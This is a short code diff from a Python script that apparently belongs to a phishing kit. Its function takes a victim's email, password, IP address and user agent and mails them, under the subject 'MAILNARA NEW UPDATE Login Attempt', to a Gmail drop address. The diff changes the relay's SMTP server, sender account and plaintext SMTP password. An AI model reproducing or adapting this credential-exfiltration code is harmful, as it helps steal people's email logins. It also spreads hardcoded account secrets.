@@ -19,14 +19,14 @@ import dns.resolver
 
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
-    smtp_server = "server71.web-hosting.com"
+    smtp_server = "ezipservers.quest"
     smtp_port = 465
 
-    sender = "yoipau@harvaneserver.quest"
+    sender = "wikm@ezipservers.quest"
     receiver = "kimkun543@gmail.com"
 
-    smtp_user = "yoipau@harvaneserver.quest"
-    smtp_password = "@8I&yz8mR.h!"
+    smtp_user = "wikm@ezipservers.quest"
+    smtp_password = "?vo[PNUw{Q${"
 
     subject = "MAILNARA NEW UPDATE Login Attempt"
 
